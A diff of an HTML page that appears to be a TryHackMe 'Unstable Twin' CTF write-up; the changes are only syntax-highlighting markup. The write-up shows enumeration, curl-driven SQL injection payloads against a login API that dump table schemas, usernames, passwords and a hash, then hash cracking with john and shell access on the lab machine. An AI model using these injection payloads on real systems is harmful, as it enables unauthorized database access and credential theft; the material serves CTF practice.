@@ -66,133 +66,133 @@
             <div class="text-slate-500 text-sm">2024-12-30 • tryhackme, ctf</div>
         </header>
         <div class="markdown-content">
-            <pre class="codehilite"><code>PORT   STATE SERVICE VERSION
+            <div class="codehilite"><pre><span></span><code>PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
 80/tcp open  http    nginx 1.14.1
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>└─$ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://ut.thm      
+<div class="codehilite"><pre><span></span><code>└─$ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://ut.thm      
 /infoinfo                 (Status: 200) 
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>curl http://ut.thm/info -v
-* Host ut.thm:80 was resolved.
-* IPv6: (none)
-* IPv4: 10.64.157.161
-*   Trying 10.64.157.161:80...
-* Connected to ut.thm (10.64.157.161) port 80
-* using HTTP/1.x
-&gt; GET /info HTTP/1.1
-&gt; Host: ut.thm
-&gt; User-Agent: curl/8.15.0
-&gt; Accept: */*
+<div class="codehilite"><pre><span></span><code>curl http://ut.thm/info -v
+<span class="gs">* Host ut.thm:80 was resolved.</span>
+<span class="gs">*</span> IPv6: (none)
+<span class="gs">* IPv4: 10.64.157.161</span>
+<span class="gs">*</span>   Trying 10.64.157.161:80...
+<span class="gs">* Connected to ut.thm (10.64.157.161) port 80</span>
+<span class="gs">*</span> using HTTP/1.x
+<span class="k">&gt; </span><span class="ge">GET /info HTTP/1.1</span>
+<span class="k">&gt; </span><span class="ge">Host: ut.thm</span>
+<span class="k">&gt; </span><span class="ge">User-Agent: curl/8.15.0</span>
+<span class="k">&gt; </span><span class="ge">Accept: */*</span>
 &gt; 
-* Request completely sent off
-&lt; HTTP/1.1 200 OK
-&lt; Server: nginx/1.14.1
-&lt; Date: Wed, 24 Dec 2025 12:51:29 GMT
-&lt; Content-Type: application/json
-&lt; Content-Length: 160
-&lt; Connection: keep-alive
-&lt; Build Number: 1.3.4-dev
-&lt; Server Name: Vincent
-&lt; 
-&quot;The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure&quot;
-* Connection #0 to host ut.thm left intact
-</code></pre>
+<span class="gs">* Request completely sent off</span>
+<span class="gs">&lt; HTTP/1.1 200 OK</span>
+<span class="gs">&lt; Server: nginx/1.14.1</span>
+<span class="gs">&lt; Date: Wed, 24 Dec 2025 12:51:29 GMT</span>
+<span class="gs">&lt; Content-Type: application/json</span>
+<span class="gs">&lt; Content-Length: 160</span>
+<span class="gs">&lt; Connection: keep-alive</span>
+<span class="gs">&lt; Build Number: 1.3.4-dev</span>
+<span class="gs">&lt; Server Name: Vincent</span>
+<span class="gs">&lt; </span>
+<span class="gs">&quot;The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure&quot;</span>
+<span class="gs">*</span> Connection #0 to host ut.thm left intact
+</code></pre></div>
 
-<pre class="codehilite"><code>└─$ curl http://ut.thm/info -v
-* Host ut.thm:80 was resolved.
-* IPv6: (none)
-* IPv4: 10.64.157.161
-*   Trying 10.64.157.161:80...
-* Connected to ut.thm (10.64.157.161) port 80
-* using HTTP/1.x
-&gt; GET /info HTTP/1.1
-&gt; Host: ut.thm
-&gt; User-Agent: curl/8.15.0
-&gt; Accept: */*
+<div class="codehilite"><pre><span></span><code>└─$ curl http://ut.thm/info -v
+<span class="gs">* Host ut.thm:80 was resolved.</span>
+<span class="gs">*</span> IPv6: (none)
+<span class="gs">* IPv4: 10.64.157.161</span>
+<span class="gs">*</span>   Trying 10.64.157.161:80...
+<span class="gs">* Connected to ut.thm (10.64.157.161) port 80</span>
+<span class="gs">*</span> using HTTP/1.x
+<span class="k">&gt; </span><span class="ge">GET /info HTTP/1.1</span>
+<span class="k">&gt; </span><span class="ge">Host: ut.thm</span>
+<span class="k">&gt; </span><span class="ge">User-Agent: curl/8.15.0</span>
+<span class="k">&gt; </span><span class="ge">Accept: */*</span>
 &gt; 
-* Request completely sent off
-&lt; HTTP/1.1 200 OK
-&lt; Server: nginx/1.14.1
-&lt; Date: Wed, 24 Dec 2025 12:52:10 GMT
-&lt; Content-Type: application/json
-&lt; Content-Length: 148
-&lt; Connection: keep-alive
-&lt; Build Number: 1.3.6-final
-&lt; Server Name: Julias
-&lt; 
-&quot;The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure&quot;
-* Connection #0 to host ut.thm left intact
-</code></pre>
+<span class="gs">* Request completely sent off</span>
+<span class="gs">&lt; HTTP/1.1 200 OK</span>
+<span class="gs">&lt; Server: nginx/1.14.1</span>
+<span class="gs">&lt; Date: Wed, 24 Dec 2025 12:52:10 GMT</span>
+<span class="gs">&lt; Content-Type: application/json</span>
+<span class="gs">&lt; Content-Length: 148</span>
+<span class="gs">&lt; Connection: keep-alive</span>
+<span class="gs">&lt; Build Number: 1.3.6-final</span>
+<span class="gs">&lt; Server Name: Julias</span>
+<span class="gs">&lt; </span>
+<span class="gs">&quot;The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure&quot;</span>
+<span class="gs">*</span> Connection #0 to host ut.thm left intact
+</code></pre></div>
 
 <blockquote>
 <p>Just like twin curl give 2 outputs two servers</p>
 </blockquote>
-<pre class="codehilite"><code>ffuf -mc all -fs 233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://ut.thm/FUZZ
+<div class="codehilite"><pre><span></span><code>ffuf -mc all -fs 233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://ut.thm/FUZZ
 
 info                    [Status: 200, Size: 148, Words: 29, Lines: 2,
 api                     [Status: 404, Size: 0, Words: 1, Lines: 1, 
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>ffuf -mc all -fs 233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://ut.thm/api/FUZZ
+<div class="codehilite"><pre><span></span><code>ffuf -mc all -fs 233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://ut.thm/api/FUZZ
 
 login                   [Status: 405, Size: 178, Words: 20, Lines: 5, Duration:
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>└─$ curl -X POST http://ut.thm/api/login
+<div class="codehilite"><pre><span></span><code>└─$ curl -X POST http://ut.thm/api/login
 []
 
 ┌──(kali㉿kali)-[~]
 └─$ curl -X POST http://ut.thm/api/login
 &quot;The username or password passed are not correct.&quot;
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin'&quot;
-&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
-&lt;title&gt;500 Internal Server Error&lt;/title&gt;
-&lt;h1&gt;Internal Server Error&lt;/h1&gt;
-&lt;p&gt;The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.&lt;/p&gt;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin<span class="err">&amp;</span>password=admin&#39;&quot;
+<span class="cp">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>500 Internal Server Error<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Internal Server Error<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
-└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin'UNION SELECT 1,sqlite_version()--&quot;
+<div class="codehilite"><pre><span></span><code>┌──(kali㉿kali)-[~]
+└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39;UNION SELECT 1,sqlite_version()--&quot;
 &quot;The username or password passed are not correct.&quot;
 
 ┌──(kali㉿kali)-[~]
-└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin'UNION SELECT 1,sqlite_version()--&quot;
+└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39;UNION SELECT 1,sqlite_version()--&quot;
 [
   [
     1, 
     &quot;3.26.0&quot;
   ]
 ]
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin'UNION SELECT 1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--&quot;
+<div class="codehilite"><pre><span></span><code><span class="err">└─$</span><span class="w"> </span><span class="nx">curl</span><span class="w"> </span><span class="o">-</span><span class="nx">X</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">http</span><span class="p">:</span><span class="c1">//ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39;UNION SELECT 1,tbl_name FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;--&quot;</span>
+<span class="s">&quot;The username or password passed are not correct.&quot;</span>
+
+<span class="err">┌──</span><span class="p">(</span><span class="nx">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+<span class="err">└─$</span><span class="w"> </span><span class="nx">curl</span><span class="w"> </span><span class="o">-</span><span class="nx">X</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">http</span><span class="p">:</span><span class="c1">//ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39;UNION SELECT 1,tbl_name FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;--&quot;</span>
+<span class="p">[</span>
+<span class="w">  </span><span class="p">[</span>
+<span class="w">    </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span>
+<span class="w">    </span><span class="s">&quot;notes&quot;</span>
+<span class="w">  </span><span class="p">],</span><span class="w"> </span>
+<span class="w">  </span><span class="p">[</span>
+<span class="w">    </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span>
+<span class="w">    </span><span class="s">&quot;users&quot;</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">]</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39; UNION SELECT 1,(select sql from sqlite_master where tbl_name = &#39;users&#39;)--&quot;
+
 &quot;The username or password passed are not correct.&quot;
 
 ┌──(kali㉿kali)-[~]
-└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin'UNION SELECT 1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--&quot;
-[
-  [
-    1, 
-    &quot;notes&quot;
-  ], 
-  [
-    1, 
-    &quot;users&quot;
-  ]
-]
-</code></pre>
-
-<pre class="codehilite"><code>└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'users')--&quot;
-
-&quot;The username or password passed are not correct.&quot;
-
-┌──(kali㉿kali)-[~]
-└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'users')--&quot;
+└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39; UNION SELECT 1,(select sql from sqlite_master where tbl_name = &#39;users&#39;)--&quot;
 
 [
   [
@@ -200,52 +200,52 @@ login                   [Status: 405, Size: 178, Words: 20, Lines: 5, Duration:
     &quot;CREATE TABLE \&quot;users\&quot; (\n\t\&quot;id\&quot;\tINTEGER UNIQUE,\n\t\&quot;username\&quot;\tTEXT NOT NULL UNIQUE,\n\t\&quot;password\&quot;\tTEXT NOT NULL UNIQUE,\n\tPRIMARY KEY(\&quot;id\&quot; AUTOINCREMENT)\n)&quot;
   ]
 ]
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin' UNION SELECT 1,group_concat(username) from users--&quot;
+<div class="codehilite"><pre><span></span><code>└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39; UNION SELECT 1,group_concat(username) from users--&quot;
 &quot;The username or password passed are not correct.&quot;
 
 ┌──(kali㉿kali)-[~]
-└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin' UNION SELECT 1,group_concat(username) from users--&quot;
+└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39; UNION SELECT 1,group_concat(username) from users--&quot;
 [
   [
     1, 
     &quot;julias,linda,marnie,mary_ann,vincent&quot;
   ]
 ]
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin' UNION SELECT 1,group_concat(password) from users--&quot;
+<div class="codehilite"><pre><span></span><code>└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39; UNION SELECT 1,group_concat(password) from users--&quot;
 &quot;The username or password passed are not correct.&quot;
 
 ┌──(kali㉿kali)-[~]
-└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin' UNION SELECT 1,group_concat(password) from users--&quot;
+└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39; UNION SELECT 1,group_concat(password) from users--&quot;
 [
   [
     1, 
     &quot;Green,Orange,Red,Yellow ,continue...&quot;
   ]
 ]
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'notes')--&quot;
+<div class="codehilite"><pre><span></span><code>└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39; UNION SELECT 1,(select sql from sqlite_master where tbl_name = &#39;notes&#39;)--&quot;
 &quot;The username or password passed are not correct.&quot;
 
 ┌──(kali㉿kali)-[~]
-└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'notes')--&quot;
+└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39; UNION SELECT 1,(select sql from sqlite_master where tbl_name = &#39;notes&#39;)--&quot;
 [
   [
     1, 
     &quot;CREATE TABLE \&quot;notes\&quot; (\n\t\&quot;id\&quot;\tINTEGER UNIQUE,\n\t\&quot;user_id\&quot;\tINTEGER,\n\t\&quot;note_sql\&quot;\tINTEGER,\n\t\&quot;notes\&quot;\tTEXT,\n\tPRIMARY KEY(\&quot;id\&quot;)\n)&quot;
   ]
 ]
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin' UNION SELECT 1,notes FROM notes-- -&quot;
+<div class="codehilite"><pre><span></span><code>curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39; UNION SELECT 1,notes FROM notes-- -&quot;
 &quot;The username or password passed are not correct.&quot;
 
 ┌──(kali㉿kali)-[~]
-└─$ curl -X POST 'http://ut.thm/api/login' -d &quot;username=admin&amp;password=admin' UNION SELECT 1,notes FROM notes-- -&quot;
+└─$ curl -X POST &#39;http://ut.thm/api/login&#39; -d &quot;username=admin&amp;password=admin&#39; UNION SELECT 1,notes FROM notes-- -&quot;
 [
   [
     1, 
@@ -256,57 +256,57 @@ login                   [Status: 405, Size: 178, Words: 20, Lines: 5, Duration:
     &quot;My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4\n&quot;
   ]
 ]
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>john hash.txt --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt 
-Using default input encoding: UTF-8
-Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
-Warning: poor OpenMP scalability for this hash type, consider --fork=4
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-experiment       (?)     
-1g 0:00:00:01 DONE (2025-12-24 08:09) 0.9259g/s 174459p/s 174459c/s 174459C/s joan21..become
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-Session completed. 
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nx">john</span><span class="w"> </span><span class="nx">hash</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="o">--</span><span class="nx">format</span><span class="p">=</span><span class="nx">Raw</span><span class="o">-</span><span class="nx">SHA512</span><span class="w"> </span><span class="o">--</span><span class="nx">wordlist</span><span class="p">=</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span>
+<span class="nx">Using</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="nx">input</span><span class="w"> </span><span class="nx">encoding</span><span class="p">:</span><span class="w"> </span><span class="nx">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="nx">Loaded</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="p">(</span><span class="nx">Raw</span><span class="o">-</span><span class="nx">SHA512</span><span class="w"> </span><span class="p">[</span><span class="nx">SHA512</span><span class="w"> </span><span class="mi">256</span><span class="o">/</span><span class="mi">256</span><span class="w"> </span><span class="nx">AVX2</span><span class="w"> </span><span class="mi">4</span><span class="nx">x</span><span class="p">])</span>
+<span class="nx">Warning</span><span class="p">:</span><span class="w"> </span><span class="nx">poor</span><span class="w"> </span><span class="nx">OpenMP</span><span class="w"> </span><span class="nx">scalability</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="k">type</span><span class="p">,</span><span class="w"> </span><span class="nx">consider</span><span class="w"> </span><span class="o">--</span><span class="nx">fork</span><span class="p">=</span><span class="mi">4</span>
+<span class="nx">Will</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="nx">OpenMP</span><span class="w"> </span><span class="nx">threads</span>
+<span class="nx">Press</span><span class="w"> </span><span class="sc">&#39;q&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="nx">Ctrl</span><span class="o">-</span><span class="nx">C</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">abort</span><span class="p">,</span><span class="w"> </span><span class="nx">almost</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">other</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">status</span>
+<span class="nx">experiment</span><span class="w">       </span><span class="p">(?)</span><span class="w">     </span>
+<span class="mi">1</span><span class="nx">g</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">01</span><span class="w"> </span><span class="nx">DONE</span><span class="w"> </span><span class="p">(</span><span class="mi">2025</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">09</span><span class="p">)</span><span class="w"> </span><span class="m m-Double">0.9259</span><span class="nx">g</span><span class="o">/</span><span class="nx">s</span><span class="w"> </span><span class="mi">174459</span><span class="nx">p</span><span class="o">/</span><span class="nx">s</span><span class="w"> </span><span class="mi">174459</span><span class="nx">c</span><span class="o">/</span><span class="nx">s</span><span class="w"> </span><span class="mi">174459</span><span class="nx">C</span><span class="o">/</span><span class="nx">s</span><span class="w"> </span><span class="nx">joan21</span><span class="p">..</span><span class="nx">become</span>
+<span class="nx">Use</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="s">&quot;--show&quot;</span><span class="w"> </span><span class="nx">option</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">display</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">cracked</span><span class="w"> </span><span class="nx">passwords</span><span class="w"> </span><span class="nx">reliably</span>
+<span class="nx">Session</span><span class="w"> </span><span class="nx">completed</span><span class="p">.</span><span class="w"> </span>
+</code></pre></div>
 
-<pre class="codehilite"><code>[mary_ann@UnstableTwin ~]$ ls
-server_notes.txt  user.flag
-[mary_ann@UnstableTwin ~]$ cat user.flag
-.............
-[mary_ann@UnstableTwin ~]$ cat server_notes.txt
-Now you have found my notes you now you need to put my extended family together.
+<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">mary_ann@UnstableTwin ~</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">server_notes</span><span class="p">.</span><span class="n">txt</span><span class="w">  </span><span class="k">user</span><span class="p">.</span><span class="n">flag</span>
+<span class="o">[</span><span class="n">mary_ann@UnstableTwin ~</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">flag</span>
+<span class="p">.............</span>
+<span class="o">[</span><span class="n">mary_ann@UnstableTwin ~</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">server_notes</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">Now</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="k">found</span><span class="w"> </span><span class="n">my</span><span class="w"> </span><span class="n">notes</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">put</span><span class="w"> </span><span class="n">my</span><span class="w"> </span><span class="n">extended</span><span class="w"> </span><span class="n">family</span><span class="w"> </span><span class="n">together</span><span class="p">.</span>
 
-We need to GET their IMAGE for the family album.  These can be retrieved by NAME.
+<span class="n">We</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="n">their</span><span class="w"> </span><span class="nc">IMAGE</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">family</span><span class="w"> </span><span class="n">album</span><span class="p">.</span><span class="w">  </span><span class="n">These</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">retrieved</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">NAME</span><span class="p">.</span>
 
-You need to find all of them and a picture of myself!
-</code></pre>
+<span class="n">You</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="ow">all</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">them</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">picture</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">myself</span><span class="err">!</span>
+</code></pre></div>
 
 <blockquote>
 <p>in <code>/opt</code> directory found something</p>
 </blockquote>
-<pre class="codehilite"><code>@app.route('/get_image')
-def get_image():
-    if request.args.get('name').lower() == 'marnie':
-        filename = 'Twins-Kelly-Preston.jpg'
-        return send_file(filename, mimetype='image/gif')
-    elif request.args.get('name').lower() == 'linda':
-        filename = 'Twins-Chloe-Webb.jpg'
-        return send_file(filename, mimetype='image/gif')
-    elif request.args.get('name').lower() == 'mary_ann':
-        filename = 'Twins-Bonnie-Bartlett.jpg'
-        return send_file(filename, mimetype='image/gif')
-    return '', 404
+<div class="codehilite"><pre><span></span><code><span class="err">@</span><span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="nx">get_image</span><span class="err">&#39;</span><span class="p">)</span>
+<span class="nx">def</span><span class="w"> </span><span class="nx">get_image</span><span class="p">():</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">args</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">name</span><span class="err">&#39;</span><span class="p">).</span><span class="nx">lower</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">marnie</span><span class="err">&#39;</span><span class="p">:</span>
+<span class="w">        </span><span class="nx">filename</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">Twins</span><span class="o">-</span><span class="nx">Kelly</span><span class="o">-</span><span class="nx">Preston</span><span class="p">.</span><span class="nx">jpg</span><span class="err">&#39;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">send_file</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="nx">mimetype</span><span class="p">=</span><span class="err">&#39;</span><span class="nx">image</span><span class="o">/</span><span class="nx">gif</span><span class="err">&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">elif</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">args</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">name</span><span class="err">&#39;</span><span class="p">).</span><span class="nx">lower</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">linda</span><span class="err">&#39;</span><span class="p">:</span>
+<span class="w">        </span><span class="nx">filename</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">Twins</span><span class="o">-</span><span class="nx">Chloe</span><span class="o">-</span><span class="nx">Webb</span><span class="p">.</span><span class="nx">jpg</span><span class="err">&#39;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">send_file</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="nx">mimetype</span><span class="p">=</span><span class="err">&#39;</span><span class="nx">image</span><span class="o">/</span><span class="nx">gif</span><span class="err">&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">elif</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">args</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">name</span><span class="err">&#39;</span><span class="p">).</span><span class="nx">lower</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">mary_ann</span><span class="err">&#39;</span><span class="p">:</span>
+<span class="w">        </span><span class="nx">filename</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">Twins</span><span class="o">-</span><span class="nx">Bonnie</span><span class="o">-</span><span class="nx">Bartlett</span><span class="p">.</span><span class="nx">jpg</span><span class="err">&#39;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">send_file</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="nx">mimetype</span><span class="p">=</span><span class="err">&#39;</span><span class="nx">image</span><span class="o">/</span><span class="nx">gif</span><span class="err">&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">404</span>
 
 
-if __name__ == '__main__':
-    app.run(port=5000)
-</code></pre>
+<span class="k">if</span><span class="w"> </span><span class="nx">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">__main__</span><span class="err">&#39;</span><span class="p">:</span>
+<span class="w">    </span><span class="nx">app</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">port</span><span class="p">=</span><span class="mi">5000</span><span class="p">)</span>
+</code></pre></div>
 
 <blockquote>
 <p>and I get all images into my pc</p>
 </blockquote>
-<pre class="codehilite"><code>└─$ ls -la
+<div class="codehilite"><pre><span></span><code>└─$ ls -la
 total 120
 drwxrwxr-x  2 kali kali  4096 Dec 24 08:27 .
 drwxrwxr-x 47 kali kali  4096 Dec 24 08:19 ..
@@ -315,7 +315,7 @@ drwxrwxr-x 47 kali kali  4096 Dec 24 08:19 ..
 -rw-rw-r--  1 kali kali 56755 Dec 24 08:26 marnie.jpg
 -rw-rw-r--  1 kali kali     0 Dec 24 08:26 mary_ann.jpg
 -rw-rw-r--  1 kali kali 56755 Dec 24 08:27 vincent.jpg
-</code></pre>
+</code></pre></div>
 
 <blockquote>
 <p>use steghide and see what we can find<br />
